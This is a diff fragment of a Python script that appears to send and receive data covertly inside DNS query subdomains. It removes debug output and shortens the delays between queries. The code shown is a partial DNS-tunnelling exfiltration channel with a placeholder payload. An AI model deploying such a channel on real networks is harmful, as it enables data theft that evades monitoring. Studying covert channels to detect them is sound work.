@@ -14,15 +14,12 @@ received_chunks = []
 
 # Function to handle incoming DNS packets
 def dns_sniffer(packet):
-    print("[Sniffer] Packet received")  # Debugging message to confirm packet reception
     if packet.haslayer(DNS) and packet.getlayer(DNS).qd is not None:  # Capture only valid DNS query packets
         try:
             query_name = packet.getlayer(DNS).qd.qname.decode().strip('.')
             
             # Filter packets to only process those with the target domain
             if DOMAIN in query_name:
-                print(f"[Sniffer] Received query: {query_name}")
-                
                 # Extract the data chunk from the subdomain (first part of the query name)
                 if '-' in query_name:
                     split_query = query_name.split('-')
@@ -69,16 +66,12 @@ def send_covert_payload(payload, domain=DOMAIN):
         # Send the packet
         print(f"[Sender] Sending DNS query: {query_domain}")
         send(packet, verbose=False)
-        time.sleep(random.uniform(0.5, 2.0))  # Random delay for more natural traffic
+        time.sleep(random.uniform(0.5, 1.0))  # Reduced delay for more efficient transmission
 
 # Start sending and receiving DNS packets
 if __name__ == "__main__":
     # Example payload to send covertly
     secret_payload = "This is a secret payload."
-    
-    # Print available network interfaces
-    print("Available network interfaces:")
-    print(conf.ifaces)
     
     # Start a sniffer in a separate thread
     import threading
@@ -89,7 +82,7 @@ if __name__ == "__main__":
     sniffer_thread.start()
     
     # Ensure sniffer is running before sending payload
-    time.sleep(5)  # Increased delay to ensure sniffer is ready
+    time.sleep(2)  # Reduced delay to improve efficiency
     print("[Main] Sniffer thread started. Sending payload...")
     
     # Send the covert payload
